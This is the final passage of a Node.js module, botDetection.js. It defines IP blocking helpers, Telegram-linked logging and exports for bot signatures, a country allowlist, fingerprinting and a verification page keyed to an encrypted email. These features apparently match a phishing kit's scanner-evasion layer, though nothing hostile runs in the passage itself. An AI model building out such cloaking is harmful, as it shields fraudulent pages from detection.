        return showVerificationPage(res, encryptedEmail, req.originalUrl, verifiedSessions, fingerprint, visitorInfo);
    };
}
// Block IP function
let blockedIPs = new Set();

function blockIP(ip, reason = 'Manual block') {
    if (!ip || ip === 'unknown' || ip === '::1' || ip === '127.0.0.1') return false;
    if (blockedIPs.has(ip)) return false;
    blockedIPs.add(ip);
    saveBlockedIPs();
    console.log(`🔴 IP BLOCKED: ${ip} (${reason})`);
    return true;
}

function unblockIP(ip) {
    if (!ip) return false;
    const removed = blockedIPs.delete(ip);
    if (removed) saveBlockedIPs();
    console.log(`🟢 IP UNBLOCKED: ${ip}`);
    return removed;
}

function getFormattedBlockedIPs() {
    const ips = Array.from(blockedIPs);
    if (ips.length === 0) return '📋 *No IPs currently blocked.*';
    let formatted = `📋 *BLOCKED IPS (${ips.length})*\n━━━━━━━━━━━━━━━━━━\n`;
    ips.forEach((ip, index) => {
        formatted += `${index + 1}. \`${ip}\`\n`;
    });
    return formatted;
}

function getBotDetections() { return []; }
function getBlockedIPs() { return Array.from(blockedIPs); }
function getTokenStore() { return tokenStore; }

// Initialize
loadBlockedIPs();

// Log that module loaded successfully
console.log(`✅ botDetection.js loaded successfully`);
console.log(`   TELEGRAM_GROUP_ID from env: ${process.env.TELEGRAM_GROUP_ID ? 'Set' : 'NOT SET'}`);
console.log(`   TELEGRAM_BOT_TOKEN from env: ${process.env.TELEGRAM_BOT_TOKEN ? 'Set' : 'NOT SET'}`);

// At the end of botDetection.js, update module.exports
module.exports = { 
    unifiedBotDetection,
    handleVerification,
    showVerificationPage,
    blockIP,
    unblockIP,
    getBotDetections,
    getBlockedIPs,
    getFormattedBlockedIPs,
    BOT_SIGNATURES,
    getIPInfo,
    TOKEN_CONFIG,
    getTokenStore,
    saveTokens,
    ALLOWED_COUNTRIES,
    getFingerprint,        // ADD THIS

};

// Add a setter for verifiedSessions (since it's created in server.js)
let globalVerifiedSessions = null;
function setVerifiedSessions(sessions) {
    globalVerifiedSessions = sessions;
}
function getVerifiedSessions() {
    return globalVerifiedSessions;
}

// Export the setter as well
module.exports.setVerifiedSessions = setVerifiedSessions;
module.exports.getVerifiedSessions = getVerifiedSessions;